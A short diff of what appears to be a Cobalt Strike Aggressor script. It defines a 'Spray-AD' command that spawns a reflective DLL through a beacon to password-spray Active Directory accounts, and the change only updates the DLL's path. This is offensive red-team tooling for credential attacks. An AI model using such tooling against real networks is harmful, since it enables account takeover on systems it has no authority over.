@@ -21,6 +21,6 @@ alias Spray-AD {
 	}
     else{
         blog($bid, "Let's start spraying useraccounts with password: " . $object . "\n");
-        bdllspawn($bid, script_resource("Spray-AD.dll"), $object, "Spray-AD", 5000, false);
+        bdllspawn($bid, script_resource("exe/Spray-AD.dll"), $object, "Spray-AD", 5000, false);
 	}
 }
